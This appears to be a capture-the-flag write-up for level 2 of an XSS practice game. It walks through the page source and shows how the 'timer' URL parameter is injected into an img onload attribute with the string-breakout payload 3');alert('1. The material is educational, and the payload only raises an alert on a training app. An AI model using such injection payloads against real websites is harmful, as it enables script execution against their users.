### XSSGame Level 2 Writeup 
 ![2-1](https://github.com/user-attachments/assets/ff827c26-9eef-48b9-bc75-b20e465a8303)



When I first opened the challenge, I noticed an **input field** that takes a number, along with a **"Create Timer"** button.  
I clicked the button to understand how it works and then checked the **page source code**.

Here’s what I found:

```html
<html>
  <head>
    <script src="/static/js/js_frame.js"></script>
    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() {
          window.confirm("Time is up!");
          window.loading.style.display = 'none';
          window.message.innerHTML = '<a href="?">Go back</a> to the timer setup page';
        }, seconds * 1000);
      }
    </script>
  </head>
  <body style="background-color: white;">
    <center>
      <h1 style="font-family: serif">
        webtim<span style="color: teal">r</span> <span style="color: green">pro</span>
      </h1>
      <img id="loading" src="/static/img/loading.gif" style="width: 50%" onload="startTimer('3');" />
      <br>
      <div id="message">Your timer will execute in 3 seconds.</div>
  </center>
  </body>
</html>
```

I noticed that the value we enter ends up inside the `onload` attribute of the `<img>` tag, like this:

```html
onload="startTimer('3');"
```

This value is taken from the `timer` parameter in the **URL**.

So this is the injection point where we can place our payload.

After a few attempts, I found that this payload worked:

```text
3');alert('1
```

This results in:

```html
onload="startTimer('3');alert('1')"
```

And it successfully triggers an **alert box**, confirming that the XSS is exploitable through the `onload` attribute.

![2-2](https://github.com/user-attachments/assets/bfbc082a-160d-4867-b602-f86ed6aa8cde)

---
